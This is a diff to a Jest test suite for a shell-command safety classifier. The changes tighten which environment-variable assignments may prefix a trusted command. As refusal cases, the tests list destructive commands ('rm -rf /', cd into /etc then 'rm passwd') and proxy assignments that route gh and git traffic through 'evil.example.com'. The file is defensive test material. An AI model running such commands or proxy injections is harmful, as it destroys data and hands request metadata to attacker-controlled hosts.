@@ -73,12 +73,21 @@ describe('#999 stripShellGrammar', () => {
     expect(stripShellGrammar('break rm -rf /').structural).toBe(false);
   });
 
-  test('peels assignments, including quoted values with spaces', () => {
+  test('peels an opaque-token assignment, quotes and all', () => {
     expect(stripShellGrammar('FOO=bar git status').command).toBe('git status');
-    expect(stripShellGrammar('FOO="a b" git status').command).toBe('git status');
-    expect(stripShellGrammar("FOO='a b' git status").command).toBe('git status');
+    expect(stripShellGrammar('FOO="bar" git status').command).toBe('git status');
+    expect(stripShellGrammar("FOO='bar' git status").command).toBe('git status');
     expect(stripShellGrammar('A=1 B=2 git status').command).toBe('git status');
     expect(stripShellGrammar('FOO=bar').structural).toBe(true);
+  });
+
+  test('a value with a space is NOT opaque, so it is not peeled', () => {
+    // Narrowed by the #1004 re-review: the value allowlist names the one shape
+    // that is safe, and a quoted string with a space is not it. The regex still
+    // consumes the whole quoted value (the command is left intact, never
+    // `b" git status`), it is simply refused rather than peeled.
+    expect(stripShellGrammar('FOO="a b" git status').command).toBe('FOO="a b" git status');
+    expect(stripShellGrammar("FOO='a b' git status").command).toBe("FOO='a b' git status");
   });
 
   test('an assignment does NOT bless the command it prefixes', () => {
@@ -239,7 +248,12 @@ describe('#1004 a cd behind a grammar keyword never carries a stale scratch root
     'cd /tmp/work && if true; then cd /etc; fi && rm passwd',
     'cd /tmp/work; for x in 1; do cd /etc; done; rm passwd',
     'cd /tmp/work; while true; do cd /etc; break; done; rm passwd',
-    'cd /tmp/work; until false; do cd /etc; break; done; rm passwd',
+    // `until true`, not `until false`: with a condition that is not itself
+    // covered, the command returns null for an unrelated reason and the test
+    // proves nothing about cd-tracking (caught in review — the same vacuous
+    // shape this file's own header warns about).
+    'cd /tmp/work; until true; do cd /etc; break; done; rm passwd',
+    'cd /tmp/work; until git status; do cd /etc; break; done; rm passwd',
     'cd /tmp/work && if true; then cd /Users/yahya; fi && rm -rf Documents',
   ];
   for (const cmd of escapes) {
@@ -295,5 +309,35 @@ describe('#1004 an assignment whose value is a path is never peeled', () => {
     expect(covered('ACC=da8d7a2a868 git status')).not.toBeNull();
     expect(covered('ZONE=e684135de4 git status')).not.toBeNull();
     expect(covered('HITS=0 git status')).not.toBeNull();
+  });
+});
+
+/**
+ * #1004 re-review. The value test started as "does the value name a filesystem
+ * location?" (`/[/~]/`). Proxy variables defeat that: `HTTPS_PROXY=host:port`
+ * has neither character, and `gh`/`git`/`curl`/`npm` all honour it — handing an
+ * attacker-controlled network position the request metadata, at `trusted`, with
+ * no opt-in.
+ *
+ * So the rule is inverted: name the one value shape that is SAFE (an opaque
+ * token) instead of chasing the unbounded set that is dangerous.
+ */
+describe('#1004 only an opaque-token value is peeled', () => {
+  const mustRefuse = [
+    'HTTPS_PROXY=evil.example.com:8080 gh pr view 1',
+    'HTTP_PROXY=evil.example.com:8080 gh pr view 1',
+    'ALL_PROXY=evil.example.com:1080 gh issue list',
+    'ANYTHING=user@host git status',
+    'ANYTHING=https:%2F%2Fevil git status',
+    'ANYTHING=a:b git status',
+  ];
+  for (const cmd of mustRefuse) {
+    test(JSON.stringify(cmd), () => expect(covered(cmd)).toBeNull());
+  }
+
+  test('opaque tokens still peel', () => {
+    for (const c of ['ACC=da8d7a2a868 git status', 'V=1.2.3 git status', 'N=0 git status']) {
+      expect(covered(c)).not.toBeNull();
+    }
   });
 });
